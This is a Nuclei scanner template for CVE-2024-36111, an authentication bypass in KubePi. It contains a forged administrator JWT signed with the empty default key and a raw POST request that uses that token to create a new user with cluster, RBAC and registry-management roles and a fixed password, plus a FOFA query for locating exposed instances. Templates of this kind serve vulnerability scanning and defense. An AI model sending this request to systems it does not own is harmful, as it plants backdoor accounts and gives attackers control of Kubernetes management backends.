id: CVE-2024-36111

info:
  name: KubePi JWT - Verification Bypass
  author: Co5mos
  severity: critical
  description: |
    KubePi has a JWT authentication bypass vulnerability (CVE-2024-36111). Due to the JWT key being empty in the default configuration file, an attacker can generate a JWT token with the empty key to bypass authentication, thereby taking over the backend.
  metadata:
    fofa-query: "kubepi"
  tags: kubepi, bypass, cve, cve2024

variables:
  name: "{{rand_base(8)}}"

http:
  - raw:
      - |
        POST /kubepi/api/v1/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfSwiaWF0IjoxNzE2NDQ3MDEyLCJleHAiOjE3MjI0NDcwMTJ9.dedNLwXZu0JY1sgGBCRZmpFvAnLdHjxdPmKWXA7LCf4

        {"apiVersion":"v1","kind":"User","name":"{{name}}","roles":["Common User","Manage Image Registries","Manage Clusters","Manage RBAC"],"nickName":"{{name}}","email":"{{randstr}}@{{name}}.com","authenticate":{"password":"12345678@{{name}}"},"mfa":{"enable":false,"secret":""}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, 'apiVersion\":\"v1\"')
          - contains(body, 'Manage Image Registries')
        condition: and
